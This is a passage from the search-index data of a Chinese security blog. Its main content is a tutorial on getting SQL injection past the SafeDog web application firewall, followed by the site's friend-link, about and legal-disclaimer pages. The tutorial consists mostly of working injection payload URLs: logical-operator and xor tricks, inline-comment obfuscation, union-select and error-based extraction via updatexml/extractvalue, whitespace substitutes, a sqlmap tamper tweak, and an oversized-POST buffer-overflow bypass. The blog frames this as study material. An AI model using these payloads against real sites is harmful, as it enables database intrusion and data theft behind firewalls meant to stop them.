\u0026 / * \u0026\u0026 || 等等还有很多 与运算 a \u0026 b , 或运算 a | b , 异或运算 a ^ b 那么可以试着将and替换成\u0026\u0026,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过 http://127.0.0.1/test.php?id=1' %26%26 true%23 另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持\u0026\u0026 || ,oracle不支持 \u0026\u0026 ||） http://127.0.0.1/test.php?id=1' || true%23 //将and 1=1替换为|| true,也可以绕过安全狗 http://127.0.0.1/test.php?id=1' ||(1) %23 //使用括号代替空格绕过 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1） http://127.0.0.1/test.php?id=1' xor 1%23 http://127.0.0.1/test.php?id=1' xor true%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过拦截and-11"},{"categories":["学习"],"content":" 绕过order by查询判断查询字段,使用mysql的/*!*/内敛注释去绕过防护,而其中的代码是可以正常执行的 http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过order-by查询"},{"categories":["学习"],"content":" 绕过union select查询使用union xxx页面正常 但是用union和select放在在一起就被发现啦 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过 http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+ 对于数字型注入,可以将其转换成浮点型 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过, 函数中可以插入任何混淆字符绕过waf 另外使用-1可以省去空格绕过waf http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23 基于报错信息的注入绕安全狗 http://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23 http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:4:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过union-select查询"},{"categories":["学习"],"content":" 绕过select from使用大括号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables} 使用反引号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables` 使用\\N去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\\Nfrom information_schema.tables 括号法去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables))) 也可以组合起来 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\\Nfrom{a`information_schema`.tables} 这些都是去掉空格的合法语句,当然如果不拦截/*/或/!*/的话,也可以尝试这两个 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。 补充点 php+mysql环境下支持的空格有： %0a,%0b,%0c,%0d,%20,%09,%a0,/**/ 其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。 干货分享：使用/^!$asd%2a–=/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*/换成/^!$asd%2a–=*/即可使用sqlmap跑了。 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:5:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过select-from"},{"categories":["学习"],"content":" 缓冲区溢出绕waf另外也可以对安全狗实行缓冲区溢出绕waf 缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过 要求是(针对于安全狗而已): GET类型请求转换成POST类型 Content-Length头长度大于4008 正常参数放置在脏数据后面 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:6:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#缓冲区溢出绕waf"},{"categories":null,"content":" 缥缈博客 缥缈个人博客 远海的博客 远海的博客 独自等待博客 关注信息安全 国光 逆水行舟，不进则退。 Perfare's Blog 不可能有技术含量 WebShell'S Blog 蛋疼的人生不需要解释！ 本站优先招原创内容的博客或网站，站点主题内容是互联网、技术、生活分享类博客优先。 未受到搜索引擎惩罚，百度或谷歌正常收录 PR\u003e=0。 站点时间不超过 3 个月，文章数量不超过 10 篇，且长期不更新，申请链接不予受理! 要求贵站页面设计整洁，内容健康，符合中国法律法规。 不接受广告联盟、营销网站之类站点的链接，且无恶意代码。 会不定期回访并清除部分不符合要求的友链。 注：请按照下方格式留言，麻烦站长们先在自己的站点添加上本站友链，我会尽快添加你的友链并通知你。 网站名称：bysec 网站链接：https://www.bysec.cn/ 网站头像：https://q.qlogo.cn/headimg_dl?dst_uin=1726946232\u0026spec=640 网站描述：bysec信息安全个人博客 ","date":"2020-05-20","objectID":"/link/:0:0","series":null,"tags":null,"title":"友链","uri":"/link/#"},{"categories":null,"content":" 关于网站 个人博客，欢迎交流。 邮箱: bysec@qq.com ","date":"2020-05-20","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于网站"},{"categories":null,"content":" 关于网站 个人博客，欢迎交流。 邮箱: bysec@qq.com ","date":"2020-05-20","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于","uri":"/about/#个人博客欢迎交流"},{"categories":null,"content":" 关于作者 💻 技术宅，热爱关于计算机的一切 😱 强迫症与拖延症患者 🤔 热衷于了解世界的运转机制 ❤️ 爱好动漫、音乐、游戏 ","date":"2020-05-20","objectID":"/about/:2:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于作者"},{"categories":null,"content":" 关于版权本站所有的原创文章均受 创作共享 署名-非商业性 4.0 许可协议 / CC BY-NC 4.0 保护。 ","date":"2020-05-20","objectID":"/about/:3:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于版权"},{"categories":null,"content":" 用户条款 警告 《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。 警告 《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行 禁止 本站提供的一切软件、教程和内容信息仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。 ","date":"2020-05-20","objectID":"/about/:4:0","series":null,"tags":null,"title":"关于","uri":"/about/#用户条款"}]